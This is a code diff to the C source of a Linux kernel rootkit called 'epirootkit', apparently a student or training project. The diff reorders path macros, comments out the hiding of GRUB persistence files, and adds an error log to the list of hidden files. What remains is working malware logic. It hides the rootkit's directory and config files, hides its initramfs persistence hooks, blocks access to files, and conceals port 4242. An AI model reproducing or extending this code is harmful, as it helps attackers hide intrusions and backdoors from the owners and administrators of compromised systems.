@@ -6,6 +6,11 @@
 #include "ftrace.h"
 #include "hide_api.h"
 
+#define HIDE_CFG_FILE_FULL_PATH HIDDEN_DIR_PATH "/" HIDE_CFG_FILE
+#define FORBID_CFG_FILE_FULL_PATH HIDDEN_DIR_PATH "/" FORBID_CFG_FILE
+#define ALTERATE_CFG_FILE_FULL_PATH HIDDEN_DIR_PATH "/" ALTERATE_CFG_FILE
+#define HIDE_PORT_CFG_FILE_FULL_PATH HIDDEN_DIR_PATH "/" HIDE_PORT_CFG_FILE
+
 int init_interceptor(void) {
     int err;
 
@@ -45,11 +50,6 @@ int init_interceptor(void) {
         return err;
     }
 
-    #define HIDE_CFG_FILE_FULL_PATH HIDDEN_DIR_PATH "/" HIDE_CFG_FILE
-    #define FORBID_CFG_FILE_FULL_PATH HIDDEN_DIR_PATH "/" FORBID_CFG_FILE
-    #define ALTERATE_CFG_FILE_FULL_PATH HIDDEN_DIR_PATH "/" ALTERATE_CFG_FILE
-    #define HIDE_PORT_CFG_FILE_FULL_PATH HIDDEN_DIR_PATH "/" HIDE_PORT_CFG_FILE
-
     // Hide directory HIDDEN_DIR_PATH
     hide_file(HIDDEN_DIR_PATH);
     hide_file(HIDE_CFG_FILE_FULL_PATH);
@@ -75,14 +75,15 @@ int init_interceptor(void) {
     hide_file("/usr/lib/epirootkit");
 
     // Hide grub peristence stuff
-    hide_file("/.grub.sh");
-    hide_file("/etc/default/grub.d/99.cfg");
-    forbid_file("/.grub.sh");
-    forbid_file("/etc/default/grub.d/99.cfg");
+    // hide_file("/.grub.sh");
+    // hide_file("/etc/default/grub.d/99.cfg");
+    // forbid_file("/.grub.sh");
+    // forbid_file("/etc/default/grub.d/99.cfg");
 
     // Hide initramfs persistence stuff
     hide_file("/etc/initramfs-tools/hooks/epirootkit");
     hide_file("/etc/initramfs-tools/scripts/init-premount/epirootkit-load");
+    hide_file("/tmp/insmod.err");
 
     // Hide ports
     hide_port("4242");
